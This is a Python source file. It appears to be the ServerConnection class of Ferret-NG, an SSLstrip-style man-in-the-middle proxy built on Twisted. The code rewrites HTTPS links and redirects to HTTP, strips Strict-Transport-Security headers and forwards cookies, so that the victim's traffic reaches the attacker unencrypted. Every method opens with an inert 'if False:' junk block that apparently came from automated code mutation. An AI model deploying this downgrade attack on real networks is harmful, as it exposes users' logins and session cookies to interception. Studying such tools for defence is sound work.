import logging
import re
import string
import random
import zlib
import gzip
import StringIO
import sys
from core.logger import logger
from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor
formatter = logging.Formatter('%(asctime)s [Ferret-NG] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logger().setup_logger('Ferret_ServerConnection', formatter)

class ServerConnection(HTTPClient):
    """ The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    """
    urlExpression = re.compile('(https://[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)', re.IGNORECASE)
    urlType = re.compile('https://', re.IGNORECASE)
    urlExplicitPort = re.compile('https://([a-zA-Z0-9.]+):[0-9]+/', re.IGNORECASE)
    urlTypewww = re.compile('https://www', re.IGNORECASE)
    urlwExplicitPort = re.compile('https://www([a-zA-Z0-9.]+):[0-9]+/', re.IGNORECASE)
    urlToken1 = re.compile('(https://[a-zA-Z0-9./]+\\?)', re.IGNORECASE)
    urlToken2 = re.compile('(https://[a-zA-Z0-9./]+)\\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        if False:
            while True:
                i = 10
        self.command = command
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.client = client
        self.clientInfo = None
        self.urlMonitor = URLMonitor.getInstance()
        self.isImageRequest = False
        self.isCompressed = False
        self.contentLength = None
        self.shutdownComplete = False

    def getPostPrefix(self):
        if False:
            i = 10
            return i + 15
        return 'POST'

    def sendRequest(self):
        if False:
            for i in range(10):
                print('nop')
        if self.command == 'GET':
            log.debug(self.client.getClientIP() + 'Sending Request: {}'.format(self.headers['host']))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        if False:
            i = 10
            return i + 15
        for (header, value) in self.headers.iteritems():
            log.debug('[ServerConnection] Sending header: ({}: {})'.format(header, value))
            self.sendHeader(header, value)
        self.endHeaders()

    def sendPostData(self):
        if False:
            print('Hello World!')
        self.transport.write(self.postData)

    def connectionMade(self):
        if False:
            for i in range(10):
                print('nop')
        log.debug('[ServerConnection] HTTP connection made.')
        self.sendRequest()
        self.sendHeaders()
        if self.command == 'POST':
            self.sendPostData()

    def handleStatus(self, version, code, message):
        if False:
            i = 10
            return i + 15
        log.debug('[ServerConnection] Server response: {} {} {}'.format(version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        if False:
            print('Hello World!')
        if key.lower() == 'location':
            value = self.replaceSecureLinks(value)
        if key.lower() == 'content-type':
            if value.find('image') != -1:
                self.isImageRequest = True
                log.debug('[ServerConnection] Response is image content, not scanning')
        if key.lower() == 'content-encoding':
            if value.find('gzip') != -1:
                log.debug('[ServerConnection] Response is compressed')
                self.isCompressed = True
        elif key.lower() == 'strict-transport-security':
            log.debug('[ServerConnection] Zapped a strict-transport-security header')
        elif key.lower() == 'content-length':
            self.contentLength = value
        elif key.lower() == 'set-cookie':
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
        if False:
            for i in range(10):
                print('nop')
        if self.isImageRequest and self.contentLength != None:
            self.client.setHeader('Content-Length', self.contentLength)
        if self.length == 0:
            self.shutdown()
        if logging.getLevelName(log.getEffectiveLevel()) == 'DEBUG':
            for (header, value) in self.client.headers.iteritems():
                log.debug('[ServerConnection] Receiving header: ({}: {})'.format(header, value))

    def handleResponsePart(self, data):
        if False:
            return 10
        if self.isImageRequest:
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if False:
            while True:
                i = 10
        if self.isImageRequest:
            self.shutdown()
        else:
            try:
                HTTPClient.handleResponseEnd(self)
            except:
                pass

    def handleResponse(self, data):
        if False:
            i = 10
            return i + 15
        if self.isCompressed:
            log.debug('[ServerConnection] Decompressing content...')
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
        data = self.replaceSecureLinks(data)
        log.debug('[ServerConnection] Read from server {} bytes of data'.format(len(data)))
        if self.contentLength != None:
            self.client.setHeader('Content-Length', len(data))
        try:
            self.client.write(data)
        except:
            pass
        try:
            self.shutdown()
        except:
            log.info('[ServerConnection] Client connection dropped before request finished.')

    def replaceSecureLinks(self, data):
        if False:
            print('Hello World!')
        iterator = re.finditer(ServerConnection.urlExpression, data)
        for match in iterator:
            url = match.group()
            log.debug('[ServerConnection] Found secure reference: ' + url)
            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
        data = re.sub(ServerConnection.urlExplicitPort, 'http://\\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if False:
            while True:
                i = 10
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:
                self.client.finish()
                self.transport.loseConnection()
            except:
                pass